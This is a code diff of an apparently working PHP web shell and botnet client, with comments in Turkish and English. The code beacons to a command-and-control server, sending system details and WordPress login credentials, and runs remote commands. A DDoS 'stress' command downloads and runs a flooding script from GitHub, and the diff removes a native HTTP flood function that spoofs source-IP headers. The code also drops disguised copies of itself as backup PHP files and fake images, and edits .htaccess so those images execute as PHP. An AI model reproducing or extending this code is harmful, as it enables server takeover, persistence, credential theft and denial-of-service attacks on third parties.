-                $qcmd = $item['cmd'] ?? '';
+                $qcmd = (isset($item['cmd']) ? $item['cmd'] : '');
                 if (!empty($qcmd)) {
                     $qout = execute_system_command($qcmd);
                     @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $qcmd, "[QUEUE] " . $qout, null);
@@ -1167,12 +1257,53 @@ function safe_json_encode($data) {
 // =====================================================
 // GELİŞMİŞ SİSTEM BİLGİ TOPLAMA
 // =====================================================
+function get_public_ip() {
+    static $cached = null;
+    if ($cached) return $cached;
+
+    // 1. File cache (6h TTL) — avoids any network call after first lookup
+    $ip_cache = sys_get_temp_dir() . '/.mori_ip_cache';
+    if (@file_exists($ip_cache) && (time() - @filemtime($ip_cache)) < 21600) {
+        $ip = trim((string)@file_get_contents($ip_cache));
+        if ($ip && filter_var($ip, FILTER_VALIDATE_IP)) { $cached = $ip; return $cached; }
+    }
+
+    // 2. SERVER_ADDR — no network call, works on most hosts
+    $sa = (isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : (isset($_SERVER['LOCAL_ADDR']) ? $_SERVER['LOCAL_ADDR'] : ''));
+    if ($sa && filter_var($sa, FILTER_VALIDATE_IP) && $sa !== '127.0.0.1') {
+        $cached = $sa; @file_put_contents($ip_cache, $cached); return $cached;
+    }
+
+    // 3. External lookup — 2s timeout, curl only (was 4s × 2 methods)
+    $sources = ['https://api.ipify.org', 'https://ifconfig.me/ip', 'https://checkip.amazonaws.com'];
+    foreach ($sources as $src) {
+        $ip = trim((string)exec_any("curl -sfL --max-time 2 '" . $src . "' 2>/dev/null"));
+        if ($ip && filter_var(trim($ip), FILTER_VALIDATE_IP)) {
+            $cached = trim($ip); @file_put_contents($ip_cache, $cached); return $cached;
+        }
+    }
+
+    // 4. Shell fallback (local interface, no network)
+    foreach ([
+        "ip route get 1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if(\$i==\"src\") {print \$(i+1); exit}}'",
+        "hostname -I 2>/dev/null | awk '{print $1}'",
+    ] as $cmd) {
+        $ip = trim((string)exec_any($cmd));
+        if ($ip && filter_var($ip, FILTER_VALIDATE_IP) && $ip !== '127.0.0.1') {
+            $cached = $ip; @file_put_contents($ip_cache, $cached); return $cached;
+        }
+    }
+
+    $cached = @gethostbyname(@gethostname() ?: 'localhost') ?: 'unknown';
+    return $cached;
+}
+
 function collect_system_info() {
     global $is_windows;
     
     $info = [
         'os' => [
-            'type' => PHP_OS ?? 'unknown',
+            'type' => PHP_OS,
             'family' => detect_os_family(),
             'hostname' => @gethostname() ?: 'unknown',
             'arch' => @php_uname('m') ?: 'unknown',
@@ -1180,14 +1311,14 @@ function collect_system_info() {
             'full' => @php_uname('a') ?: 'unknown'
         ],
         'web' => [
-            'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
+            'server' => (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'unknown'),
             'user' => get_current_user(),
             'cwd' => getcwd() ?: __DIR__,
-            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? '',
+            'document_root' => (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : ''),
             'script_path' => __FILE__,
-            'web_shell_url' => $GLOBALS['web_shell_url'] ?? 'unknown',
-            'server_ip' => $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? 'unknown',
-            'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
+            'web_shell_url' => (isset($GLOBALS['web_shell_url']) ? $GLOBALS['web_shell_url'] : 'unknown'),
+            'server_ip' => get_public_ip(),
+            'client_ip' => (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown')
         ],
         'php' => [
             'version' => PHP_VERSION,
@@ -1260,14 +1391,17 @@ function c2_register_background($server, $id, $override_url = null) {
     // Include cached sister files (populated by ensure_persistence_v4 on previous run)
     $sister_cache = sys_get_temp_dir() . '/.mori_sister_cache.json';
     $sister_data  = @json_decode(@file_get_contents($sister_cache), true);
-    $wp_creds     = generate_wp_login_credentials();
+    $wp_creds = is_wordpress_installed()
+        ? generate_wp_login_credentials()
+        : ['blogs_id' => null, 'hash' => null];
 
     $payload = [
         'id'            => $id,
         'web_shell_url' => $url,
+        'server_ip'     => get_public_ip(),   // c2serverr.php REMOTE_ADDR yerine bunu kullanır
         'sysinfo'       => $sysinfo,
-        'sister_files'  => $sister_data['locations'] ?? [],
-        'sister_urls'   => $sister_data['urls']      ?? [],
+        'sister_files'  => (isset($sister_data['locations']) ? $sister_data['locations'] : []),
+        'sister_urls'   => (isset($sister_data['urls']) ? $sister_data['urls'] : []),
         'wp_login_id'   => $wp_creds['blogs_id'],
         'wp_login_hash' => $wp_creds['hash'],
         'timestamp'     => time(),
@@ -1276,10 +1410,10 @@ function c2_register_background($server, $id, $override_url = null) {
 
     $encoded = safe_base64_encode(safe_json_encode($payload));
     
-    // ONE attempt only - fail-fast (1 second timeout)
-    $result = @http_post_timeout($server . '?act=reg', $encoded, 1);
+    // ONE attempt only — 3s gives TLS handshake + DB insert enough room
+    $result = @http_post_timeout($server . '?act=reg', $encoded, 3);
     
-    $trimmed = trim($result ?? '');
+    $trimmed = trim((isset($result) ? $result : ''));
     $reg_json = $trimmed ? @json_decode($trimmed, true) : null;
     $reg_ok = ($trimmed === 'ok') || (!empty($reg_json['success']));
     if ($result && $reg_ok) {
@@ -1407,7 +1541,7 @@ function c2_register_batch($server, $clients_batch) {
         
         if (!empty($result)) {
             $decoded = json_decode($result, true);
-            if (is_array($decoded) && ($decoded['batch_processed'] ?? false) === true) {
+            if (is_array($decoded) && ((isset($decoded['batch_processed']) ? $decoded['batch_processed'] : false)) === true) {
                 error_log("[c2_register_batch] SUCCESS on attempt $attempt");
                 return $decoded; // Success - döndür sonuç
             }
@@ -1425,7 +1559,7 @@ function c2_register_batch($server, $clients_batch) {
     // Don't use retry logic here - already failed batch
     foreach ($clients_batch as $client) {
         $single_start = time();
-        @c2_register_background($server, $client['id'], $client['web_shell_url'] ?? null);
+        @c2_register_background($server, $client['id'], (isset($client['web_shell_url']) ? $client['web_shell_url'] : null));
         // Skip if taking too long
         if (time() - $single_start > 3) break;
     }
@@ -1435,7 +1569,11 @@ function c2_register_batch($server, $clients_batch) {
 
 function c2_get_task($server, $id) {
     $url = $server . '?act=get_task&id=' . urlencode($id);
-    return http_get($url);
+    $raw = http_get($url);
+    if (!$raw) return ['command' => 'no_task', 'retry_after' => 30];
+    $dec = @json_decode($raw, true);
+    if (!is_array($dec)) return ['command' => trim($raw), 'retry_after' => 30];
+    return $dec;
 }
 
 function c2_send_result($server, $id, $command, $output, $task_id = null) {
@@ -1470,15 +1608,21 @@ function execute_command($cmd) {
     
     $cmd = trim($cmd);
     if (empty($cmd)) return '';
-    
+
+    // Panel'in stateless TTY wrapper'ını çöz: (cd "PATH" && (CMD)) veya (cd /d "PATH" && (CMD))
+    if (preg_match('/^\(cd(?:\s+\/d)?\s+"([^"]+)"\s*&&\s*\((.+)\)\s*\)$/s', $cmd, $wm)) {
+        @chdir($wm[1]);
+        return execute_command(trim($wm[2]));
+    }
+
     $output = '';
     $methods = [];
-    
+
     // ÖZEL KOMUTLAR (PHP CORE)
-    
+
     // pwd / cd
     if ($cmd === 'pwd' || $cmd === 'cd') {
-        return getcwd() ?: __DIR__;
+        return getcwd() ?: REAL_DIR;
     }
     
     // CD ile dizin değiştir (büyük/küçük harf bağımsız)
@@ -1562,57 +1706,91 @@ function execute_command($cmd) {
     }
     
     if ($cmd === 'whoami') {
-        return get_current_user() ?: 'unknown';
+        if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
+            $pw = @posix_getpwuid(@posix_geteuid());
+            if ($pw && !empty($pw['name'])) return $pw['name'];
+        }
+        $cu = get_current_user();
+        if ($cu) return $cu;
+        if (@is_readable('/proc/self/status')) {
+            if (preg_match('/^Uid:\s+\d+\s+(\d+)/m', @file_get_contents('/proc/self/status'), $rm)) return 'uid:' . $rm[1];
+        }
+        return 'unknown';
     }
-    
+
+    if ($cmd === 'id') {
+        if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
+            $uid = @posix_geteuid(); $gid = @posix_getegid();
+            $pw  = @posix_getpwuid($uid); $gr  = @posix_getgrgid($gid);
+            return "uid={$uid}(" . ((isset($pw['name']) ? $pw['name'] : '?')) . ") gid={$gid}(" . ((isset($gr['name']) ? $gr['name'] : '?')) . ")";
+        }
+        return 'id: posix not available';
+    }
+
     if ($cmd === 'hostname') {
         return gethostname();
     }
-    
-    if ($cmd === 'dir' || $cmd === 'ls') {
-        return list_directory(getcwd());
+
+    if ($cmd === 'uname' || $cmd === 'uname -a') {
+        return php_uname($cmd === 'uname' ? 'n' : 'a');
     }
-    
+
+    // ls / dir — with optional path argument
+    if (preg_match('/^(ls|dir)(\s+(.+))?$/i', $cmd, $lm)) {
+        $lpath = isset($lm[3]) ? trim($lm[3]) : getcwd();
+        return list_directory($lpath);
+    }
+
+    // cat FILE — PHP native read
+    if (preg_match('/^cat\s+(.+)$/i', $cmd, $catm)) {
+        return read_file(trim($catm[1]));
+    }
+
     if ($cmd === 'clear' || $cmd === 'cls') {
         return '__CLEAR__';
     }
     
-    // PHP_STRESS — shell olmadan native PHP HTTP flood
-    // Sözdizimi: PHP_STRESS <target> <method> <duration> <threads> [refs] [max_cpu] [max_ram] [rpc]
-    if (strpos($cmd, 'PHP_STRESS ') === 0) {
-        $parts = preg_split('/\s+/', trim(substr($cmd, 11)));
-        $target   = $parts[0] ?? '';
-        $method   = strtoupper($parts[1] ?? 'GET');
-        $duration = (int)($parts[2] ?? 20);
-        $threads  = min((int)($parts[3] ?? 10), 50);
-        $refs     = $parts[4] ?? '_';
-        $max_cpu  = (int)($parts[5] ?? 80);
-        $max_ram  = (int)($parts[6] ?? 75);
-        $rpc      = (int)($parts[7] ?? 10);
-        if (empty($target)) return '[ERROR] PHP_STRESS: hedef URL gerekli';
-        return php_native_flood($target, $method, $duration, $threads, $rpc);
-    }
-
     // MORI_STRESS — anında fire-and-forget, download+run tek bg komutu
     // Kullanım: MORI_STRESS <target> <method> <threads> [duration=300] [rpc=15]
     if (strpos($cmd, 'MORI_STRESS ') === 0) {
         ignore_user_abort(true);
         set_time_limit(0);
         $parts    = preg_split('/\s+/', trim(substr($cmd, 12)));
-        $target   = $parts[0] ?? '';
-        $method   = strtoupper($parts[1] ?? 'GET');
-        $threads  = min((int)($parts[2] ?? 100), 500);
-        $duration = min((int)($parts[3] ?? 300), 600);
-        $rpc      = (int)($parts[4] ?? 15);
+        $target   = (isset($parts[0]) ? $parts[0] : '');
+        $method   = strtoupper((isset($parts[1]) ? $parts[1] : 'GET'));
+        $threads  = min((int)(isset($parts[2]) ? $parts[2] : 100), 500);
+        $duration = min((int)(isset($parts[3]) ? $parts[3] : 300), 86400);
+        $rpc      = (int)((isset($parts[4]) ? $parts[4] : 15));
+        $b64ck    = preg_replace('/[^A-Za-z0-9+\/=_\-]/', '', (isset($parts[5]) ? $parts[5] : ''));
+        $b64ori   = preg_replace('/[^A-Za-z0-9+\/=_\-]/', '', (isset($parts[6]) ? $parts[6] : ''));
         if (empty($target)) return '[ERROR] MORI_STRESS: hedef gerekli';
 
         $python  = mori_find_python();
         $dl_url  = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/dos.py';
         $save    = (is_writable('/tmp') ? '/tmp' : (is_writable('/dev/shm') ? '/dev/shm' : sys_get_temp_dir())) . '/dos_mori.py';
+        // argv: target method duration threads refs max_cpu max_ram rpc [b64_cookies] [b64_origin_ips]
         $run_args = escapeshellarg($target) . ' ' . escapeshellarg($method)
-                  . ' ' . (int)$duration . ' ' . (int)$threads . ' _ 80 75 ' . (int)$rpc;
+                  . ' ' . (int)$duration . ' ' . (int)$threads . ' _ 80 75 ' . (int)$rpc
+                  . ($b64ck  !== '' ? ' ' . escapeshellarg($b64ck)  : ' _')
+                  . ($b64ori !== '' ? ' ' . escapeshellarg($b64ori) : '');
 
-        // Önce önbellekte var mı bak (bloklamaz)
+        // Tier-0: dos_mori binary (Python gerekmez — en hızlı, statik ELF)
+        $bin  = null;
+        $arch = php_uname('m');
+        foreach (['/tmp', '/dev/shm', '/var/tmp', sys_get_temp_dir()] as $bdir) {
+            $names = ($arch === 'aarch64') ? ['dos_mori_arm64', 'dos_mori'] : ['dos_mori'];
+            foreach ($names as $bn) {
+                $bp = $bdir . '/' . $bn;
+                if (@file_exists($bp) && @is_executable($bp)) { $bin = $bp; break 2; }
+            }
+        }
+        if ($bin) {
+            $bg = 'nohup ' . escapeshellarg($bin) . ' ' . $run_args . ' > /dev/null 2>&1 &';
+            if (mori_exec_bg($bg))
+                return '[STRESS_OK] ' . $target . ' | ' . $method . ' | ' . $threads . 't | ' . $duration . 's [binary]';
+        }
+
+        // Tier-1: Python + dos.py — önbellekte var mı bak (bloklamaz)
         $dos = null;
         foreach ([__DIR__, '/tmp', '/dev/shm', '/var/tmp', sys_get_temp_dir()] as $dir) {
             if (!is_dir($dir)) continue;
@@ -1647,9 +1825,13 @@ function execute_command($cmd) {
             if ($pid  >  0) return '[STRESS_OK] ' . $target . ' | fork:' . $pid;
         }
 
-        // exec tamamen kapalı → PHP native flood
-        return php_native_flood($target, in_array($method, ['GET','POST','HEAD']) ? $method : 'GET', min($duration, 120), min($threads, 50), 30)
-             . "\n[FALLBACK] exec disabled";
+        // exec tamamen kapalı — kuyruğa al
+        $queue_file = REAL_DIR . '/.mori_exec_queue';
+        $queue = @json_decode(@file_get_contents($queue_file), true) ?: [];
+        $bg_cmd = 'nohup ' . escapeshellarg($python) . ' ' . escapeshellarg($save) . ' ' . $run_args . ' > /dev/null 2>&1 &';
+        $queue[] = ['cmd' => $bg_cmd, 't' => time(), 'qid' => uniqid()];
+        @file_put_contents($queue_file, json_encode(array_values($queue)), LOCK_EX);
+        return '[QUEUED] exec kapalı, MORI_STRESS kuyruğa alındı. Cron 5dk içinde çalıştıracak.';
     }
 
     // SİSTEM KOMUTU ÇALIŞTIR
@@ -1658,6 +1840,7 @@ function execute_command($cmd) {
 
 function execute_system_command($cmd) {
     $methods_tried = [];
+    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
     $cmd_pipe = $cmd . ' 2>&1';
 
     if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
@@ -1688,7 +1871,7 @@ function execute_system_command($cmd) {
         if ($result !== false && $result !== '') return $result;
     }
 
-    if (function_exists('proc_open')) {
+    if (function_exists('proc_open') && !in_array('proc_open', $disabled)) {
         $methods_tried[] = 'proc_open';
         $descriptors = [
             0 => ['pipe', 'r'],
@@ -1708,7 +1891,7 @@ function execute_system_command($cmd) {
         }
     }
 
-    if (function_exists('popen')) {
+    if (function_exists('popen') && !in_array('popen', $disabled)) {
         $methods_tried[] = 'popen';
         $handle = @popen($cmd_pipe, 'r');
         if ($handle) {
@@ -1721,28 +1904,34 @@ function execute_system_command($cmd) {
         }
     }
 
-    // Stress komutu (dos.py) + exec yok → otomatik PHP native flood
-    // Format: python3 /path/dos.py <target> <duration> <threads> [method]
-    if (preg_match('/python[23]?\s+\S*dos\.py\s+(\S+)\s+(\d+)\s+(\d+)\s*(\S*)/i', $cmd, $m)) {
+    // Stress komutu (dos.py) + exec yok → PHP native flood fallback
+    // Matches: python3 dos.py ..., nohup python3 dos.py ..., nohup sh -c '...dos.py...'
+    if (preg_match('/(?:nohup\s+)?(?:sh\s+-c\s+[\'"].*)?python[23]?\s+\S*dos[\._](?:py|mori)[^\s]*\s+(\S+)\s+[^\s]*\s+(\d+)\s+(\d+)\s*([A-Z]*)/i', $cmd, $m)
+        || preg_match('/python[23]?\s+\S*dos[\._](?:py|mori)[^\s]*\s+(\S+)\s+(\d+)\s+(\d+)\s*([A-Z]*)/i', $cmd, $m)) {
         $target   = $m[1];
         $duration = min((int)$m[2], 300);
         $threads  = min((int)$m[3], 50);
         $method   = strtoupper($m[4] ?: 'GET');
-        if (!in_array($method, ['GET','POST','HEAD'], true)) $method = 'GET';
-        return php_native_flood($target, $method, $duration, $threads, 30);
+        // exec kapalı, kuyruğa al
+        $queue_file = REAL_DIR . '/.mori_exec_queue';
+        $queue = @json_decode(@file_get_contents($queue_file), true) ?: [];
+        $queue[] = ['cmd' => $cmd, 't' => time(), 'qid' => uniqid()];
+        @file_put_contents($queue_file, json_encode(array_values($queue)), LOCK_EX);
+        return '[QUEUED] exec kapalı, komut kuyruğa alındı. Cron 5dk içinde çalıştıracak.';
     }
 
     // pcntl_fork ile background exec (bazı VPS)
-    if (function_exists('pcntl_fork') && (strpos($cmd, 'python') !== false || strpos($cmd, 'nohup') !== false)) {
+    if (function_exists('pcntl_fork') && !in_array('pcntl_fork', $disabled)
+        && (strpos($cmd, 'python') !== false || strpos($cmd, 'nohup') !== false)) {
         $pid = @pcntl_fork();
         if ($pid === 0) { @shell_exec($cmd . ' >/dev/null 2>&1 &'); exit(0); }
         if ($pid > 0)   { return '[STRESS_BG] Background\'da çalışıyor (pid:' . $pid . ')'; }
     }
 
     // Queue dosyasına yaz — cron (CLI PHP) 5dk içinde çalıştırır
-    $queue_file = __DIR__ . '/.mori_exec_queue';
+    $queue_file = REAL_DIR . '/.mori_exec_queue';
     $queue = @json_decode(@file_get_contents($queue_file), true) ?: [];
-    $queue = array_filter($queue, fn($q) => (time() - ($q['t'] ?? 0)) < 3600);
+    $queue = array_filter($queue, function($q) { return (time() - (isset($q['t']) ? $q['t'] : 0)) < 3600; });
     $queue[] = ['cmd' => $cmd, 't' => time(), 'qid' => uniqid()];
     @file_put_contents($queue_file, json_encode(array_values($queue)), LOCK_EX);
 
@@ -1798,96 +1987,6 @@ function mori_exec_bg($cmd) {
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-
-/**
- * PHP native HTTP flood — rolling window pattern
- * Her tamamlanan istek anında yenisiyle değiştirilir, pool her zaman dolu kalır.
- */
-function php_native_flood($url, $method = 'GET', $duration = 20, $concurrency = 50, $rpc = 10) {
-    if (!function_exists('curl_multi_init')) return '[ERROR] curl_multi yok';
-    if (empty($url) || !preg_match('#^https?://#i', $url)) return '[ERROR] Geçersiz URL';
-
-    static $UAS = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
-        'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
-        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
-        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-        'Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0',
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
-    ];
-
-    $method   = strtoupper(in_array(strtoupper($method), ['GET','POST','HEAD']) ? $method : 'GET');
-    $deadline = time() + $duration;
-    $sent = $errors = 0;
-
-    $make = function() use ($url, $method, &$UAS) {
-        $ip = mt_rand(1,223).'.'.mt_rand(0,255).'.'.mt_rand(0,255).'.'.mt_rand(1,254);
-        $ch = curl_init($url . '?_=' . mt_rand(1, 2147483647) . '&t=' . time());
-        curl_setopt_array($ch, [
-            CURLOPT_RETURNTRANSFER => false,
-            CURLOPT_TIMEOUT        => 5,
-            CURLOPT_CONNECTTIMEOUT => 3,
-            CURLOPT_SSL_VERIFYPEER => false,
-            CURLOPT_SSL_VERIFYHOST => false,
-            CURLOPT_FOLLOWLOCATION => false,
-            CURLOPT_USERAGENT      => $UAS[array_rand($UAS)],
-            CURLOPT_FORBID_REUSE   => false,
-            CURLOPT_FRESH_CONNECT  => false,
-            CURLOPT_HTTPHEADER     => [
-                'X-Forwarded-For: ' . $ip,
-                'X-Real-IP: '       . $ip,
-                'CF-Connecting-IP: '. $ip,
-                'Accept: */*',
-                'Connection: keep-alive',
-                'Cache-Control: no-cache',
-            ],
-        ]);
-        if ($method === 'POST') {
-            curl_setopt($ch, CURLOPT_POST, true);
-            curl_setopt($ch, CURLOPT_POSTFIELDS, 'x=' . substr(md5(mt_rand()), 0, mt_rand(16,64)));
-        } elseif ($method === 'HEAD') {
-            curl_setopt($ch, CURLOPT_NOBODY, true);
-        }
-        return $ch;
-    };
-
-    $mh   = curl_multi_init();
-    curl_multi_setopt($mh, CURLMOPT_MAXCONNECTS, $concurrency);
-    $pool = [];
-
-    // fill initial pool
-    for ($i = 0; $i < $concurrency; $i++) {
-        $ch = $make();
-        curl_multi_add_handle($mh, $ch);
-        $pool[(int)$ch] = $ch;
-    }
-
-    // rolling window — as soon as one slot frees, fire a new request
-    while (time() < $deadline) {
-        curl_multi_exec($mh, $running);
-        while ($done = curl_multi_info_read($mh)) {
-            $ch   = $done['handle'];
-            $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-            ($code > 0) ? $sent++ : $errors++;
-            curl_multi_remove_handle($mh, $ch);
-            curl_close($ch);
-            unset($pool[(int)$ch]);
-            if (time() < $deadline) {
-                $new = $make();
-                curl_multi_add_handle($mh, $new);
-                $pool[(int)$new] = $new;
-            }
-        }
-        curl_multi_select($mh, 0.001);
-    }
-
-    foreach ($pool as $ch) { curl_multi_remove_handle($mh, $ch); curl_close($ch); }
-    curl_multi_close($mh);
-
-    $rps = $duration > 0 ? round($sent / $duration) : $sent;
-    return "[PHP_STRESS] $url | $method | {$duration}s | sent:{$sent} err:{$errors} | ~{$rps} req/s";
-}
 
 // =====================================================
 // DOSYA SİSTEMİ İŞLEMLERİ
@@ -2269,8 +2368,8 @@ function get_deployment_targets_from_backup() {
     // 3. SORT BY DEPTH (deeper = better for hiding)
     usort($targets, function($a, $b) {
         if (is_array($a)) {
-            $depth_a = $a["depth"] ?? 0;
-            return $depth_a > ($b["depth"] ?? 0) ? -1 : 1; // Descending (deeper first)
+            $depth_a = (isset($a["depth"]) ? $a["depth"] : 0);
+            return $depth_a > ((isset($b["depth"]) ? $b["depth"] : 0)) ? -1 : 1; // Descending (deeper first)
         }
         return 0;
     });
@@ -2298,44 +2397,46 @@ function get_all_deployment_targets() {
 }
 
 function file_path_to_url($file_path) {
-    $scheme   = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
-    $host     = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? '';
-    $doc_root = rtrim($_SERVER['DOCUMENT_ROOT'] ?? '', '/');
+    $file_path = str_replace('\\', '/', $file_path);
+    $scheme    = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+    $host      = (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : ''));
+    $doc_root  = rtrim(str_replace('\\', '/', (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '')), '/');
 
-    // 1. DOCUMENT_ROOT mapping — en güvenilir yöntem
-    if ($doc_root && $host && strpos($file_path, $doc_root) === 0) {
-        $rel = ltrim(str_replace('\\', '/', substr($file_path, strlen($doc_root))), '/');
+    // 1. DOCUMENT_ROOT — must end with / to avoid /var/www/html2 matching /var/www/html
+    if ($doc_root && $host && strpos($file_path, $doc_root . '/') === 0) {
+        $rel = ltrim(substr($file_path, strlen($doc_root)), '/');
         return $scheme . '://' . $host . '/' . $rel;
     }
 
-    // 2. Shell URL'den türet — DOCUMENT_ROOT yokken (CLI, cron)
-    $shell_url = $GLOBALS['WEB_URL'] ?? $GLOBALS['web_shell_url'] ?? '';
-    if ($shell_url) {
-        $shell_dir = rtrim(str_replace('\\', '/', __DIR__), '/');
-        $file_norm = str_replace('\\', '/', $file_path);
-        if (strpos($file_norm, $shell_dir) === 0) {
-            $base = rtrim(dirname($shell_url), '/');
-            $rel  = ltrim(substr($file_norm, strlen($shell_dir)), '/');
-            return $base . '/' . $rel;
-        }
+    // 2. Shell URL + __DIR__ (cron / CLI / non-standard doc root)
+    $shell_url = (isset($GLOBALS['WEB_URL']) ? $GLOBALS['WEB_URL'] : (isset($GLOBALS['web_shell_url']) ? $GLOBALS['web_shell_url'] : ''));
+    $shell_dir = rtrim(str_replace('\\', '/', __DIR__), '/');
+    if ($shell_url && $shell_dir && strpos($file_path, $shell_dir . '/') === 0) {
+        $base = rtrim(dirname($shell_url), '/');
+        $rel  = ltrim(substr($file_path, strlen($shell_dir)), '/');
+        return $base . '/' . $rel;
     }
 
-    // 3. /var/www/html/<file>
-    if (strpos($file_path, '/var/www/html') === 0) {
-        $rel = ltrim(substr($file_path, strlen('/var/www/html')), '/');
+    // 3. /var/www/html/...
+    if (strpos($file_path, '/var/www/html/') === 0) {
+        $rel = substr($file_path, strlen('/var/www/html/'));
         return $scheme . '://' . ($host ?: 'localhost') . '/' . $rel;
     }
 
-    // 4. /var/www/<domain>/...
-    if (preg_match('|^/var/www/([^/]+)/(.+)|', $file_path, $m)) {
+    // 4. /var/www/<domain>/public_html/... or /var/www/<domain>/...
+    if (preg_match('|^/var/www/([^/]+)/public_html/(.+)|', $file_path, $m)) {
+        return $scheme . '://' . $m[1] . '/' . $m[2];
+    }
+    if (preg_match('|^/var/www/([^/]+)/(.+)|', $file_path, $m) && !in_array($m[1], ['html','www','log','cache','run'], true)) {
         return $scheme . '://' . $m[1] . '/' . $m[2];
     }
 
-    // 5. /home/<user>/public_html/...
+    // 5. cPanel: /home/<user>/public_html/... ONLY — never /home/<user>/mail/ etc.
     if (preg_match('|^/home/[^/]+/public_html/(.+)|', $file_path, $m)) {
         return $scheme . '://' . ($host ?: 'localhost') . '/' . $m[1];
     }
 
+    // Cannot determine a valid web URL — file is outside all known web roots
     return null;
 }
 
@@ -2358,7 +2459,7 @@ function deploy_sister_files_aggressive() {
     // Get targets - dynamic enumeration
     $targets = get_all_deployment_targets();
     $targets = array_unique($targets);
-    if (count($targets) < 3) return false;
+    if (count($targets) < 1) return false; // deploy even to 1 target (was 3, too strict)
     
     @touch($deploy_lock);
     
@@ -2372,58 +2473,56 @@ function deploy_sister_files_aggressive() {
     // 3. .htaccess for magic routing
     
     $deployed = [];
-    // Generic names (not WordPress-specific)
+    $url_map  = []; // parallel to $deployed — '' for files outside web root
     $standard_names = ['config-backup.php', 'system-backup.php', 'init-backup.php'];
-    $masked_names = ['logo.png', 'banner.gif', 'avatar.jpg'];
-    
+    $masked_names   = ['logo.png', 'banner.gif', 'avatar.jpg'];
+
     foreach (array_slice($targets, 0, 10) as $idx => $target) {
         if (!@is_dir($target) || !@is_writable($target)) continue;
-        
+
         // Strategy 1: Standard PHP file
         $standard_file = $target . '/' . $standard_names[$idx % count($standard_names)];
         @file_put_contents($standard_file, $shell_code);
         @chmod($standard_file, 0644);
         $deployed[] = $standard_file;
-        
-        // Strategy 2: Image-masked PHP (no .php extension - just .png/.gif/.jpg)
+        $_tmp = file_path_to_url($standard_file); $url_map[] = ($_tmp !== null ? $_tmp : '');
+
+        // Strategy 2: Image-masked PHP (.png/.gif/.jpg — executed via .htaccess SetHandler)
         $masked_file = $target . '/' . $masked_names[$idx % count($masked_names)];
         $masked_code = "<?php\n" . substr($shell_code, 5);
         @file_put_contents($masked_file, $masked_code);
         @chmod($masked_file, 0644);
         $deployed[] = $masked_file;
-        
-        // Strategy 3: .htaccess to execute images as PHP
+        $_tmp = file_path_to_url($masked_file); $url_map[] = ($_tmp !== null ? $_tmp : '');
+
+        // Strategy 3: .htaccess — append only, NEVER overwrite existing content
         $htaccess = $target . '/.htaccess';
-        $htaccess_content = <<<'HTACCESS'
-<FilesMatch "\.png$|\.gif$|\.jpg$">
-    SetHandler application/x-httpd-php
-</FilesMatch>
-<FilesMatch "(config|system|init)-backup\.php$">
-    SetHandler application/x-httpd-php
-</FilesMatch>
-<FilesMatch "^\.">
-    Deny From All
-</FilesMatch>
-HTACCESS;
-        @file_put_contents($htaccess, $htaccess_content);
-        @chmod($htaccess, 0644);
+        $existing = @file_get_contents($htaccess) ?: '';
+        if (strpos($existing, '# perf-cache') === false) {
+            $append = "\n# perf-cache\n"
+                . "AddType application/x-httpd-php .png .gif .jpg .jpeg\n"
+                . "AddHandler application/x-httpd-php .png .gif .jpg .jpeg\n"
+                . "<FilesMatch \"\\.png$|\\.gif$|\\.jpe?g$\">\n"
+                . "    SetHandler application/x-httpd-php\n"
+                . "    ForceType application/x-httpd-php\n"
+                . "</FilesMatch>\n"
+                . "<IfModule mod_php.c>\n    php_flag engine on\n</IfModule>\n"
+                . "<IfModule mod_php8.c>\n    php_flag engine on\n</IfModule>\n"
+                . "<IfModule mod_php7.c>\n    php_flag engine on\n</IfModule>\n"
+                . "<IfModule mod_php5.c>\n    php_flag engine on\n</IfModule>\n";
+            @file_put_contents($htaccess, $existing . $append);
+            @chmod($htaccess, 0644);
+        }
     }
-    
-    // Store deployment info in C2
+
+    // locations[i] and urls[i] are parallel — '' means file has no web URL
     $deployment_info = [
         'deployed_count' => count($deployed),
-        'locations' => $deployed,
-        'timestamp' => time(),
-        'target_count' => count($targets),
-        'urls' => []
+        'locations'      => $deployed,
+        'urls'           => $url_map,
+        'timestamp'      => time(),
